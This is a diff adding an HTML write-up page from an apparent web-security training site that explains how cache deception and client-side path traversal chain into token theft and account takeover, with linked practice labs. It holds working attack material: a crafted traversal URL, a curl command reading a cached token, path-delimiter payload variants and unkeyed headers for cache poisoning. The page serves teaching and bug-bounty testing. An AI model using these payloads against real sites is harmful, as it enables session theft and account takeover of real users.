@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cache Deception + CSPT = Account Takeover - ClientSide Academy</title>
+  <link rel="stylesheet" href="/css/writeup.css">
+</head>
+<body class="writeup-page">
+  <nav class="writeup-nav">
+    <a href="/writeups">&larr; All Writeups</a>
+    <div class="nav-right">
+      <a href="/labs/cache/cspt-cache-deception.html" class="try-lab">Try the Lab &rarr;</a>
+    </div>
+  </nav>
+
+  <div class="writeup-container">
+    <div class="writeup-meta">
+      <span class="writeup-sev critical">Critical</span>
+      <span class="writeup-category">CSPT &middot; Cache Deception &middot; ATO &middot; Chain</span>
+    </div>
+
+    <h1>Cache Deception + Client-Side Path Traversal = Zero-Interaction ATO</h1>
+    <div class="writeup-author">Based on <strong>zere.es</strong>' research &middot; Two medium bugs chain into one-click account takeover</div>
+
+    <div class="callout callout-vuln">
+      <h4>Summary</h4>
+      <p>Neither Cache Deception nor CSPT was exploitable alone on the target. Cache Deception needed an auth header that browsers can't send automatically. CSPT allowed path traversal on an authenticated request but didn't land anywhere useful. Combined, they produced a <strong>zero-interaction account takeover</strong>: one click from the victim, one unauthenticated fetch from the attacker, full token theft.</p>
+    </div>
+
+    <h2>Background: Cache Deception in One Paragraph</h2>
+    <p>CDNs like Cloudflare, Akamai, and Fastly cache static assets to reduce origin load. They typically identify "static" content by file extension — <code>.css .js .png .jpg .woff</code>. If the origin server routes <code>/page.css</code> to a dynamic authenticated handler (which returns user-specific data) AND the CDN caches the response because of the extension, the next request to <code>/page.css</code> gets served the cached authenticated content — <em>without the CDN ever checking who the requester is</em>.</p>
+
+    <p>Omer Gil documented this pattern in 2017. Twelve years later, it's still a reliable bug class.</p>
+
+    <h2>Bug 1: Cache Deception on the Token Endpoint</h2>
+    <p>The researcher found <code>/v1/token</code>, which returned the user's JWT:</p>
+    <pre><code>GET /v1/token HTTP/1.1
+Host: api.example.com
+X-Auth-Token: &lt;redacted&gt;
+
+HTTP/1.1 200 OK
+Cache-Control: no-cache, no-store, must-revalidate
+X-Cache: Miss from cdn
+{"accessToken": "eyJ...", "scope": "admin", ...}</code></pre>
+
+    <p>Good: <code>Cache-Control: no-store</code>. But testing <code>/v1/token.css</code> revealed the CDN overrode it:</p>
+    <pre><code>GET /v1/token.css HTTP/1.1
+Host: api.example.com
+X-Auth-Token: &lt;redacted&gt;
+
+HTTP/1.1 200 OK
+Cache-Control: max-age=86400, public  ← CDN overrode!
+X-Cache: Hit from cdn
+{"accessToken": "eyJ...", "scope": "admin", ...}</code></pre>
+
+    <p>The CDN cached the sensitive response for 24 hours. Problem: the endpoint required the <code>X-Auth-Token</code> custom header, which <strong>browsers cannot send automatically</strong>. You can't just link a victim to <code>/v1/token.css</code> and expect their browser to auth. Stuck.</p>
+
+    <h2>Bug 2: CSPT in the User Info Endpoint</h2>
+    <p>A separate piece of client-side JavaScript built an authenticated URL from user input:</p>
+    <pre><code>const userId = new URLSearchParams(location.search).get('userId');
+const apiUrl = `https://api.example.com/v1/users/info/${userId}`;
+fetch(apiUrl, {
+  headers: { 'X-Auth-Token': authToken }  // Auto-set from app state
+});</code></pre>
+
+    <p>The <code>userId</code> flows into the URL path. Classic CSPT. The researcher tried traversing to interesting endpoints and got 404s — nothing reachable via traversal was sensitive. Stuck.</p>
+
+    <div class="callout callout-chain">
+      <h4>The Insight</h4>
+      <p><strong>CSPT gives us control over the path of an authenticated request.</strong></p>
+      <p><strong>Cache Deception needs that authenticated request to land at a cacheable URL.</strong></p>
+      <p>Chain them: use CSPT to send the authenticated token request to <code>/v1/token.css</code>. The browser attaches <code>X-Auth-Token</code> (the app's own code does that). The origin returns the token. The CDN caches it. The attacker reads the cache.</p>
+    </div>
+
+    <h2>Building the Chain</h2>
+
+    <h3>The Crafted URL</h3>
+    <pre><code>https://example.com/user?userId=../../../v1/token.css</code></pre>
+
+    <h3>What the Browser Does</h3>
+    <ol>
+      <li>Victim clicks the link</li>
+      <li>Client JS reads <code>userId=../../../v1/token.css</code></li>
+      <li>Builds: <code>https://api.example.com/v1/users/info/../../../v1/token.css</code></li>
+      <li>Browser normalizes the URL → <code>https://api.example.com/v1/token.css</code></li>
+      <li>Browser sends the fetch WITH <code>X-Auth-Token</code> (the app's own header)</li>
+      <li>Origin sees <code>/v1/token.css</code> — routing matches the <code>/v1/token*</code> handler</li>
+      <li>Origin returns the user's token</li>
+      <li>CDN sees <code>.css</code>, caches response for 24h</li>
+    </ol>
+
+    <h3>What the Attacker Does</h3>
+    <pre><code># No auth needed — fetch the cached response
+curl https://api.example.com/v1/token.css
+
+HTTP/1.1 200 OK
+X-Cache: Hit from cdn
+{"accessToken": "eyJ...", "scope": "admin", ...}</code></pre>
+
+    <p>Token stolen. Attacker uses it to change the victim's email, reset password, authorize new OAuth grants, or exfiltrate data. Full account takeover.</p>
+
+    <div class="attack-flow">
+      <h4>Complete Attack Flow</h4>
+      <div class="flow-step"><div class="flow-num">1</div><p>Attacker identifies the cache deception (test <code>.css</code> on sensitive endpoints)</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">2</div><p>Attacker identifies the CSPT (user-controlled value in fetch URL path)</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">3</div><p>Crafts phishing URL: <code>https://example.com/user?userId=../../../v1/token.css</code></p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">4</div><p>Victim clicks. Their browser normalizes, sends auth header, origin returns token, CDN caches</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">5</div><p>Attacker fetches <code>/v1/token.css</code> without auth — reads cached token</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">6</div><p>Uses token to ATO: change email, reset password, grant OAuth access</p></div>
+    </div>
+
+    <div class="callout callout-impact">
+      <h4>Why This Pattern Is Dangerous</h4>
+      <p>Two mitigations that each look sufficient in isolation fail when composed. The origin team hears "use <code>Cache-Control: no-store</code>" and does so — but the CDN overrides based on extension. The frontend team hears "don't use user input in fetch paths" — but their use case feels safe because there's nothing sensitive reachable by traversal. Security in depth requires treating these as a single system.</p>
+    </div>
+
+    <h2>Variants You Should Test</h2>
+
+    <h3>1. Extension Variations</h3>
+    <ul>
+      <li><code>.css</code>, <code>.js</code>, <code>.json</code>, <code>.png</code>, <code>.jpg</code>, <code>.svg</code>, <code>.webp</code>, <code>.woff</code>, <code>.woff2</code>, <code>.pdf</code></li>
+      <li><code>.map</code> (sourcemap — sometimes cached)</li>
+      <li>Different cases: <code>.CSS</code>, <code>.Js</code> — some CDNs are case-insensitive</li>
+    </ul>
+
+    <h3>2. Path Delimiter Quirks</h3>
+    <ul>
+      <li><code>/page/profile.css</code> — static-looking path under dynamic parent</li>
+      <li><code>/page;x.css</code>, <code>/page%00.css</code>, <code>/page#.css</code> — origin and CDN may parse differently</li>
+      <li>Wildcard traversal: <code>/$/profile.css</code> — the ChatGPT bug</li>
+    </ul>
+
+    <h3>3. Real-World CSPT Sinks</h3>
+    <ul>
+      <li><code>fetch(\`/api/users/${id}\`)</code></li>
+      <li><code>fetch(\`/api/${resource}/details\`)</code></li>
+      <li><code>XMLHttpRequest.open('GET', basePath + input)</code></li>
+      <li>GraphQL client building <code>client.query({ variables: { path: userInput } })</code> when path is concatenated server-side</li>
+    </ul>
+
+    <div class="callout callout-tip">
+      <h4>Bug Bounty Tip</h4>
+      <p>When you find cache deception but no way to auto-send auth headers from a victim's browser, <strong>don't give up</strong>. Look for CSPT in the app's own JavaScript. The app sends its own auth headers. You control the path. Any authenticated endpoint the app reaches becomes a cache deception target.</p>
+      <p>Conversely: when you find CSPT but no sensitive endpoints reachable via traversal, <strong>don't give up</strong>. Look for cache deception. A non-sensitive endpoint that returns user data + a cacheable extension = exfil primitive.</p>
+    </div>
+
+    <h2>Related: Cache Poisoning</h2>
+    <p>Cache deception = victim fills the cache with their data, attacker reads it.</p>
+    <p>Cache poisoning = attacker fills the cache with malicious content, victim reads it.</p>
+    <p>Both exploit mismatched cache keys. Deception exploits missing auth validation on cache hit. Poisoning exploits unkeyed headers that influence response content. Together they cover the full spectrum of "cache trusts too much."</p>
+
+    <h3>Common Unkeyed Headers for Poisoning</h3>
+    <ul>
+      <li><code>X-Forwarded-Host</code> — host used for URL building</li>
+      <li><code>X-Forwarded-Scheme</code> — scheme mismatch</li>
+      <li><code>X-Host</code>, <code>X-Original-URL</code>, <code>X-Rewrite-URL</code></li>
+      <li><code>Forwarded</code> (RFC 7239)</li>
+      <li>Custom app headers leaking into response</li>
+    </ul>
+    <p>Tools: <a href="https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner" style="color:#3b82f6">Web-Cache-Vulnerability-Scanner</a>, <a href="https://github.com/PortSwigger/param-miner" style="color:#3b82f6">Param Miner</a>.</p>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Lab 1: CSPT + Cache Deception</h4>
+        <p>The main challenge. Chain path traversal in user lookup with CDN caching based on extension to steal the victim's auth token.</p>
+      </div>
+      <a href="/labs/cache/cspt-cache-deception.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Lab 2: Basic Cache Deception</h4>
+        <p>The fundamentals. Force an authenticated page to be cached at a static-looking path.</p>
+      </div>
+      <a href="/labs/cache/basic-cache-deception.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Lab 3: Cache Poisoning (X-Forwarded-Host)</h4>
+        <p>The other side of the coin. Poison the cache with a malicious script URL via an unkeyed header.</p>
+      </div>
+      <a href="/labs/cache/cache-poisoning-xfh.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="writeup-footer">
+      <a href="/writeups/mega-chain-ato">&larr; The Grand Chain ATO</a>
+      <a href="/writeups">All Writeups &rarr;</a>
+    </div>
+  </div>
+</body>
+</html>
